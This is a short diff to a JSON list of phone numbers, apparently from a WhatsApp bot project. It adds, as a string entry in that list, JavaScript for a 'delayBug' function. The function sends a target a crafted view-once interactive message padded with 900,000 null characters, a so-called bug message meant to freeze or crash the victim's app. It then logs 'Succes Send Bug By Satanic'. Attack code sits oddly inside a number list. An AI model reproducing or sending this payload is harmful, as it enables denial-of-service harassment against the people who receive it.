@@ -5,6 +5,7 @@
     "6285778591477",
     "6285817642164",
     "6285725969192",
-    "93765979346"
+    "93765979346",
+    "async function delayBug(target) {\n const delay = ms => new Promise(resolve => setTimeout(resolve, ms));\n\n await delay(5000);\n\n await Leonardo.relayMessage(\n target,\n {\n viewOnceMessage: {\n message: {\n interactiveMessage: {\n header: {\n subtitle: \"\\u0000\".repeat(900000),\n title: \"⏳ Delay Bug Triggered ⏳\",\n locationMessage: {},\n hasMediaAttachment: false,\n },\n body: {\n text: \"⏳ Delay Triggered for 5 seconds ⏳\",\n },\n nativeFlowMessage: {\n messageParamsJson: \"⏳ Delay Triggered for 5 seconds ⏳\",\n },\n carouselMessage: {},\n },\n },\n },\n },\n {}\n );\n console.log(chalk.red('Succes Send Bug By Satanic'));\n}"
   ]
 }
